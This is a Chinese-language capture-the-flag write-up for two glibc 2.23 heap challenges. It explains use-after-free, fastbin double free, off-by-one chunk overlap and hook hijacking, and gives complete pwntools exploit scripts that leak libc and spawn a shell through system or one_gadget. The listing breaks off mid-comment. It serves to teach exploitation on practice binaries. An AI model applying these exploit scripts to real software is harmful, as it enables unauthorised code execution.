
## easy\_uaf
简单的UAF。

### 思路一
第一个思路是通过在`fastbin`中`double free`然后修改全局的`chunks`表中某一未`free`的`buf`的地址(如果有不清楚`fastbin`中`double free`的请看`fastbin`中的`double free`)，让这个地址指向`got`表中`free`函数对应的地址，然后`edit`编辑这个`buf`，等价于修改了`got`表中`free`函数的地址，我们将`free`函数的地址改为`system`函数的地址，然后将`shellcode`写在某一未`free`的`buf`的`chunk`上，然后`free`这个`buf`，此时相当于调用了`system`(`"bin/sh/"`)

```python

# encoding=utf-8

from pwn import \*

context.log\_level='debug'

context.terminal='/bin/zsh'

libc = ELF("./libc-2.23.so")

elf = ELF("./easy\_uaf")

def add(io,size,buf):

io.recvuntil(">> ")

io.sendline("1")

io.recvuntil("size: ")

io.sendline(str(size))

io.recvuntil("buf: ")

io.sendline(str(buf))

def delt(io,idx):

io.recvuntil(">> ")

io.sendline("4")

io.recvuntil("idx: ")

io.sendline(str(idx))

def show(io,idx):

io.recvuntil(">> ")

io.sendline("3")

io.recvuntil("idx: ")

io.sendline(str(idx))

def edit(io,idx,buf):

io.recvuntil(">> ")

io.sendline("2")

io.recvuntil("idx: ")

io.sendline(str(idx))

io.recvuntil("buf: ")

io.sendline(str(buf))

io = process("./easy\_uaf")

chunk = 0x6020c0 # 储存每个块的指针+大小

free\_got = elf.got['free']

chunk\_32 = 0x6020e0

size = 0x20

add(io,0x30,"b"\*0x10) #id:0

add(io,size,"a"\*0x10) #id:1

add(io,size,"b"\*0x10) #id:2

delt(io,1)

delt(io,2)

delt(io,1)

p1 = flat(p64(chunk))

add(io,size,p1) # 做假fd

add(io,size,"c"\*0x10)

add(io,size,"d"\*0x10)

# 此时fatbin指向假fd的位置

p3 = flat(p64(free\_got),p64(8))

print "free\_got :",hex(free\_got)

add(io,size,p3) # 改掉chunk的索引为free got

show(io,1) # 利用freegot泄漏free的真实地址计算libc base

free\_now = u64(io.recv(6).ljust(8,'\x00'))

print "free\_now:",hex(free\_now)

offset = free\_now-libc.sym['free']

print "offset:",hex(offset)

# pause()

# attach(io)

print "system :",hex(libc.sym['system']+offset)

sys = libc.sym['system']+offset

p4 = flat(p64(sys))

edit(io,1,p4) # 改free为system

p5 = flat("/bin/sh".ljust(0x20,"\x00"))

edit(io,3,p5) # shellcode 写入

delt(io,3)

io.interactive()

```

### 思路二
通过申请一个0x80的放入`unsortbin`和一个0x10的放入`fastbin`；然后再申请0x60，此时造成`unsortedbin`中的`chunk`被切割，返回的还是之前的`chunk`，`UAF`了（只不过此时的`size`变成0x60）
然后`show()`拿到`main_arena`地址进而获取`malloc hook`的地址，继而获取`libc_base`。
再删掉这个0x60的块（`del`时不检查这个块是否被删过了），把它放到`fastbin`
此时再直接编辑这个在`fastbin`中的块，直接改他的`fd`指针到`malloc_hook-0x23`。
然后再把它申请回来，此时`fastbin`指向`fakechunk`（`malloc_hook-0x23`）
然后调用`add`写这个`fakechunk`，改`realloc hook`为`ogg`，同时改`malloc hook`为`realloc+偏移`来调整栈空间确保满足`ogg`的条件

```python

# encoding=utf-8

from pwn import \*

#context.log\_level='debug'

context.terminal='/bin/zsh'

libc = ELF("./libc-2.23.so")

elf = ELF("./easy\_uaf")

def add(io,size,buf):

io.recvuntil(">> ")

io.sendline("1")

io.recvuntil("size: ")

io.sendline(str(size))

io.recvuntil("buf: ")

io.sendline(str(buf))

def delt(io,idx):

io.recvuntil(">> ")

io.sendline("4")

io.recvuntil("idx: ")

io.sendline(str(idx))

def show(io,idx):

io.recvuntil(">> ")

io.sendline("3")

io.recvuntil("idx: ")

io.sendline(str(idx))

def edit(io,idx,buf):

io.recvuntil(">> ")

io.sendline("2")

io.recvuntil("idx: ")

io.sendline(str(idx))

io.recvuntil("buf: ")

io.sendline(str(buf))

def debug(io):

attach(io)

pause()

io = process("./easy\_uaf")

#========================================

chunk = 0x6020c0 # 储存每个块的指针+大小

free\_got = elf.got['free']

add(io,0x80,'a'\*0x10) #先开0x80

add(io,0x10,'b'\*0x09) #再开0x10

delt(io,0) # 删掉0x80

add(io,0x60,'c'\*7) # 再开0x60此时返回的是之前删掉的0x80的块，UAF（切割）

show(io,0) # show不检查size，所以打出来main\_arena+88

io.recv(8) # 过滤8个字节

main\_arena\_88 = u64(io.recv(6).ljust(8,'\x00'))

print "main\_arena\_88: ",hex(int(main\_arena\_88)-0x80)

malloc\_hook = main\_arena\_88 - 0x80 - 88 - 0x10

print "malloc\_hook: ",hex(malloc\_hook)

offset = malloc\_hook - libc.sym['\_\_malloc\_hook']

print "libc base: ",hex(offset)

delt(io,0) # 重新再free idx：0 此时在fastbin里，注意，此时不delet 2 而是 delet 0，两个指向的是一样的，但是如果delet 2 会造成size清空导致无法edit

p1 = flat(p64(malloc\_hook-0x23))

edit(io,2,p1) # 编辑idx：2，此时这个块已经在fastbin里了，相当于直接改了fd指针。

#debug(io)

add(io,0x60,'a') # 再申请0x60，又返回了fastbin里的chunk，此时fastbin指向fake chunk

"""

0x45216 execve("/bin/sh", rsp+0x30, environ)

constraints:

rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)

constraints:

[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)

constraints:

[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)

constraints:

[rsp+0x70] == NULL

"""

ogg = 0x4526a

p2 = flat('\x00'\*0xB,p64(ogg+offset),p64(offset+libc.sym['realloc']+0x10)) # 0xB刚好到达\_\_realloc\_hook,改reallochook为ogg，改malloc为reallochook+偏移 此时调整栈空间

print "realloc hook+0ffset: ",hex(offset+libc.sym['realloc']+0x10)

print "ogg+offset: ",hex(ogg+offset)

add(io,0x60,p2)

#pydebug(io)

#delt(io,3)

#io.interactive()

io.recvuntil(">> ")

io.sendline("1")

io.sendline(str(0x60))

io.interactive()

```

## very\_easy\_heap
`glibc2.23`，漏洞点一个`uaf`一个`off-by-one`，那么由于没有`show`，那么思想就是在`fastbin`中踩出一个指向`main_arena`的指针。通过`off-by-one`做`overlap`即可。最后劫持`mallochook`为`ogg`即可
具体做法其实就是当有`off-by-one`时考虑，做`overlap`，假如可以修改`pre_in_use`位，那么比如说先申请三个`chunk`，0，1，2（其中0号为大`chunk`可直接进入`unsortbin`，1号为0x68小`chunk`，2号为大`chunk`可直接进入`unsortbin`），先`del`(0)，再`del`，`add`1号，对2号使用`off-by-one`，同时伪造`pre_size`位为0+1号的总`size`合（注意申请1号`chunk`大小以0x8结尾，方便`off-by-one`），此时指示0，1号`chunk`为`free`状态，再`del`（2），此时触发`unsortbin`的前向合并，0、1、2三个`chunk`被合并放入`unsortbin`，然后再单独`del`（1）使其进入`fastbin`，此时1号`chunk`被`overlap`，他既在`unsortbin`又再`fastbin`。
这个过程做两次，第一次踩出来用来打`stderr+157`泄露`libc`，第二次用来劫持`mallochook`

```python

# encoding=utf-8

from pwn import \*

from LibcSearcher import \*

s = lambda buf: io.send(buf)

sl = lambda buf: io.sendline(buf)

sa = lambda delim, buf: io.sendafter(delim, buf)

sal = lambda delim, buf: io.sendlineafter(delim, buf)

shell = lambda: io.interactive()

r = lambda n=None: io.recv(n)

ra = lambda t=tube.forever:io.recvall(t)

ru = lambda delim: io.recvuntil(delim)

rl = lambda: io.recvline()

rls = lambda n=2\*\*20: io.recvlines(n)

libc\_path = "/lib/x86\_64-linux-gnu/libc-2.23.so"

elf\_path = "./pwn"

libc = ELF(libc\_path)

elf = ELF(elf\_path)

#io = remote("node3.buuoj.cn",26000)

if sys.argv[1]=='1':

context(log\_level = 'debug',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')

elif sys.argv[1]=='0':

context(log\_level = 'info',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')

#io = process([elf\_path],env={"LD\_PRELOAD":libc\_path})

cho='>>>' # choice提示语

siz='len:' # size输入提示语

con='content:' # content输入提示语

ind='idx:' # index输入提示语

edi='' # edit输入提示语

def add(index,size,content='',c='1'):

sal(cho,c)

sal(ind,str(index))

sal(siz,str(size))

sa(con,content)

def free(index,c='2'):

sal(cho,c)

sal(ind,str(index))

# 获取pie基地址

def get\_proc\_base(p):

proc\_base = p.libs()[p.\_cwd+p.argv[0].strip('.')]

info(hex(proc\_base))

# 获取libc基地址

def get\_libc\_base(p):

libc\_base = p.libs()[libc\_path]

info(hex(libc\_base))

def exp():

global io

io = process(elf\_path)

add(0,0xb8,'a'\*0xb0)

add(1,0x68,'b'\*0x68)

add(2,0xf8,'c'\*0xc8)

add(3,0x28,'d'\*0x28)

free(0)

free(1)

add(1,0x68,'\x00'\*0x60+p64(0x130)+'\x00')

free(2)

free(1)

add(0,0xb8,'a'\*0xb8+'\x71')

add(1,0x70,'\xdd\x25')

free(0)

add(0,0xb8,'a'\*0xb8+'\x71')

# 劫持到stderr+157,远程需要爆破

add(4,0x68,'\xdd')

add(5,0x68,'a'\*0x33+p64(0xfbad1800)+p64(0)\*3+'\x20')

libc\_base = u64(ru('\x7f')[-6:].ljust(8,'\x00'))-(0x7ffff7dd2620-0x7ffff7a0d000)

info("libc base:"+hex(libc\_base))

malloc\_hook = libc\_base+libc.sym['\_\_malloc\_hook']

#add(2,0xef,'pppp')

info("mallochook:"+hex(malloc\_hook))

sl('1')

sal('idx:',str(2))

sal('len:',str(0xe8))

sa('content','ppp')

add(6,0xb8,'a'\*0xb0)

add(7,0x68,'b'\*0x68)

add(8,0xf8,'c'\*0xc8)

add(9,0x28,'d'\*0x28)

free(6)

free(7)

add(7,0x68,'\x00'\*0x60+p64(0x130)+'\x00')

free(7)

free(8)

add(6,0xb8,'a'\*0xb8+'\x71')

add(7,0x70,p64(malloc\_hook-0x23))

free(6)

add(6,0xb8,'a'\*0xb8+'\x71')

add(10,0x68,'\xed')

ogg = libc\_base+0xf1207

add(11,0x68,'\x00'\*0x13+p64(ogg))

sal('>>>','1')

sal("idx:",'0')

sal('len:','100')

"""

系统自带的libc one\_gadget

0x45226 execve("/bin/sh", rsp+0x30, environ)

constraints:

rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)

constraints:

[rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
